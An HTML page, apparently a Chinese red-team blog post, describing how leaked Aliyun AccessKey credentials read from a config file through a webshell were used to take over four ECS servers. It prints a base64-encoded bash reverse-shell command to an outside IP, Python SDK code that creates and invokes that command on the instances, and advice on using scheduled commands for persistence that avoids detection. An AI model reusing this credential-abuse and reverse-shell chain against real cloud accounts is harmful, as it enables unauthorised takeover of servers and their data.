@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>阿里云Access Token问题 - 项目收获记录 « 倾旋的博客</title>
+  <meta name="description" content="0x00 前言Q：在获得权限较低的Webshell的情况下，如何继续扩大收获？A：首先，信息搜集，分别包含：当前权限，主机网络环境、系统进程、网络连接状况、散落的凭证等，然后进行战略分析  是否需要提权  如何将流量带入（转发）  结合搜集的信息转化出其他更好的思路很巧，我遇到了第三种情况。Tips：内网渗透一般...">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/archivers/2019-04-02/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">阿里云Access Token问题 - 项目收获记录</h1>
+    <p class="post-meta">Apr 2, 2019</p>
+  </header>
+
+  <article class="post-content">
+    <h2 id="0x00-前言">0x00 前言</h2>
+
+<p>Q：在获得权限较低的Webshell的情况下，如何继续扩大收获？</p>
+
+<p>A：首先，信息搜集，分别包含：当前权限，主机网络环境、系统进程、网络连接状况、散落的凭证等，然后进行战略分析</p>
+
+<ol>
+  <li>是否需要提权</li>
+  <li>如何将流量带入（转发）</li>
+  <li>结合搜集的信息转化出其他更好的思路</li>
+</ol>
+
+<p>很巧，我遇到了第三种情况。</p>
+
+<p><strong>Tips：内网渗透一般提权是最不可取的方案，我们只需要不断搜集信息、撕开一个流量口子即可。</strong></p>
+
+<h2 id="0x01-阿里云对象存储---oss">0x01 阿里云对象存储 - OSS</h2>
+
+<p>什么是对象存储？</p>
+
+<p>阿里云对象存储服务（Object Storage Service，简称OSS），是阿里云对外提供的海量、安全、低成本、高可靠的云存储服务。您可以通过本文档提供的简单的REST接口，在任何时间、任何地点、任何互联网设备上进行上传和下载数据。基于OSS，您可以搭建出各种多媒体分享网站、网盘、个人和企业数据备份等基于大规模数据的服务。</p>
+
+<p>通过Webshell在目标机器（Linux）的Web站点目录下发现多个子站配置文件<code class="language-plaintext highlighter-rouge">config.php</code>，配置了同一个阿里云的OSS地址，只是存储空间（Bucket）不同。</p>
+
+<p>通常情况下一个阿里云oss地址的组成如下：</p>
+
+<p><code class="language-plaintext highlighter-rouge">http(s)://[BucketName].oss-cn-[Region].aliyuncs.com</code></p>
+
+<p>BucketName ：存储空间</p>
+
+<p>Region：地域，目前有如下几个：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b47095f0e521b2c64a785b3cbe165889.png" alt="2019-04-02-20-58-34"></p>
+
+<p>例如：杭州 = cn-hangzhou</p>
+
+<h2 id="0x02-access-token">0x02 Access Token</h2>
+
+<p>Access Token = AccessKeyId + AccessKeySecret</p>
+
+<p>OSS通过使用AccessKeyId/ AccessKeySecret对称加密的方法来验证某个请求的发送者身份。</p>
+
+<p>AccessKeyId用于标示用户，AccessKeySecret是用户用于加密签名字符串和OSS用来验证签名字符串的密钥，其中AccessKeySecret必须保密，只有用户和OSS知道。AccessKey 根据所属账号的类型有所区分。</p>
+
+<p><strong>阿里云账户AccessKey：阿里云账号提供的AccessKey拥有所属资源的全部操作权限</strong></p>
+
+<p>RAM账户AccessKey：RAM账户由阿里云账号授权生成，所拥有的AccessKey拥有对特定资源限定的操作权限</p>
+
+<p>STS临时访问凭证：由阿里云账号或RAM账号生成，所拥有的AccessKey在限定时间内拥有对特定资源限定的操作权限。过期权限收回。</p>
+
+<p><a href="https://help.aliyun.com/document_detail/31867.html?spm=a2c4g.11186623.2.7.60c35869TaDn9K#concept-e4s-mhv-tdb">详细介绍</a></p>
+
+<h2 id="0x03-通过access-token接管ecs">0x03 通过Access Token接管ECS</h2>
+
+<p>ECS：云服务器（Elastic Compute Service，简称 ECS）是一种简单高效、处理能力可弹性伸缩的计算服务，帮助您快速构建更稳定、安全的应用，提升运维效率，降低 IT 成本，使您更专注于核心业务创新。</p>
+
+<p>前面介绍到，默认情况下，阿里云用户获得的Access Token是对当前用户所有服务通用的令牌，在没有使用RAM账户的情况下，就可以使用SDK去操作阿里云所有产品。</p>
+
+<p>在此次项目里，我接管了四台ECS，执行任意命令，获得最大权限。</p>
+
+<p>首先，通过读取配置文件，获得了同于上传图片所需要认证的Access Token，如何检验是否可用的呢？</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Access Key Id : *********
+Access Secret : ***************************
+Region : cn-*****
+</code></pre></div></div>
+
+<p>下面直接调用获取ECS实例的API即可，以往情况下，我会使用Python，安装阿里云的sdk-core库，但是现在能在线调试，大大的节省了本地调试的成本：</p>
+
+<p>DescribeInstances - 获得实例信息</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e2155c603d701fd20696069aea984835.png" alt="2019-04-02-21-11-05"></p>
+
+<p>只有第一个<code class="language-plaintext highlighter-rouge">RegionId</code>是必填项，点击<code class="language-plaintext highlighter-rouge">API Explorer</code>，可以直接进入调试环境：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e7013aa30b06a0f6eb76ec22851c92b4.png" alt="2019-04-02-21-12-38"></p>
+
+<p>服务器上的oss配置中刚好有RegionId，我就直接选择了，然后填入Access Token信息，就可以获得数据。</p>
+
+<p>我是直接在<code class="language-plaintext highlighter-rouge">Alicloud Shell</code>里复制了一份运行的：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/29658b26756b91ad7999c3586697f73a.png" alt="2019-04-02-21-16-55"></p>
+
+<p>输出结果如下：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/3729d18e5454db84dfdd66b91344ea8c.png" alt="2019-04-02-21-21-17"></p>
+
+<p>使用<code class="language-plaintext highlighter-rouge">json.cn</code>格式化一下：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6be7a9b9ceb7a55095aba804a63165dc.png" alt="2019-04-02-21-23-48"></p>
+
+<p>共四台服务器，那么如何执行命令呢？</p>
+
+<p>首先要创建一条命令，然后指定实例来调用命令，手册地址：</p>
+
+<p>https://help.aliyun.com/document_detail/64844.html</p>
+
+<p>命令的类型取值范围：</p>
+
+<ul>
+  <li>RunBatScript：创建一个在 Windows 实例中运行的 Bat 脚本</li>
+  <li>RunPowerShellScript：创建一个在 Windows 实例中运行的 PowerShell 脚本</li>
+  <li>RunShellScript：创建一个在 Linux 实例中运行的 Shell 脚本</li>
+</ul>
+
+<p>由于都是Linux，我就选择RunShellScript，注意：命令必须是base64encode</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rvn0xsy@Rvn0xsy ~&gt; echo "bash -i &gt;&amp; /dev/tcp/1.1.1.1/2333 0&gt;&amp;1" | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzIzMzMgMD4mMQo=
+</code></pre></div></div>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/64788dbca11e1dfd99c53caae568dccc.png" alt="2019-04-02-21-29-22"></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/usr/bin/env python
+#coding=utf-8
+
+from aliyunsdkcore.client import AcsClient
+from aliyunsdkcore.acs_exception.exceptions import ClientException
+from aliyunsdkcore.acs_exception.exceptions import ServerException
+from aliyunsdkecs.request.v20140526.CreateCommandRequest import CreateCommandRequest
+
+client = AcsClient('&lt;accessKeyId&gt;', '&lt;accessSecret&gt;', 'cn-shanghai')
+
+request = CreateCommandRequest()
+request.set_accept_format('json')
+
+request.set_Type("RunShellScript")
+request.set_CommandContent("YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzIzMzMgMD4mMQo=")
+request.set_Name("test")
+
+response = client.do_action_with_exception(request)
+# python2:  print(response) 
+print(str(response, encoding='utf-8'))
+
+</code></pre></div></div>
+
+<p>执行成功后，会返回如下信息：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+	"RequestId": "********-****-****-****-********",
+	"CommandId": "c-0************"
+}
+</code></pre></div></div>
+
+<p>CommandId最好记下来，不然还要调用<a href="https://api.aliyun.com/find/Ecs/DescribeCommands?spm=a2c1g.8271268.10000.91.169bdf25hVPFbi">DescribeCommands</a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{
+	"PageNumber": 1,
+	"TotalCount": 1,
+	"PageSize": 10,
+	"RequestId": "********-****-****-****-********",
+	"Commands": {
+		"Command": [
+			{
+				"Name": "test",
+				"Timeout": 3600,
+				"CommandContent": "YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzIzMzMgMD4mMQo=",
+				"Description": "",
+				"Type": "RunShellScript",
+				"CommandId": "c-0************",
+				"WorkingDir": ""
+			}
+		]
+	}
+}
+</code></pre></div></div>
+
+<p>紧接着就是<code class="language-plaintext highlighter-rouge">InvokeCommand</code>：</p>
+
+<ul>
+  <li>RegionId：区域ID，例如：cn-shanghai</li>
+  <li>CommandId：命令ID</li>
+  <li>InstanceId：实例ID</li>
+  <li>Timed：命令是否为周期执行。 默认值：False</li>
+  <li>Frequency：周期任务的执行周期，两次周期任务的时间间隔不能低于10秒。当参数 Timed 的值为 True 时，参数 Frequency 为必需参数。 该参数取值遵循Cron表达式，参阅<a href="https://help.aliyun.com/document_detail/64769.html?spm=a2c4g.11186623.2.21.755e1926kBOlWA">Cron表达式</a>。</li>
+</ul>
+
+<p>默认情况下，我们不需要管后面的参数，如果你想权限维持的话，可以设置Timed为False，并且设置Frequency为定时任务计划表达式，执行的过程中，基本上不会拦截，因为Access Token的调用，一切都是白名单的。</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/af5818d425ef9c61361044a26dd6e804.png" alt="2019-04-02-21-39-17"></p>
+
+
+  </article>
+  
+  
+
+
+
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
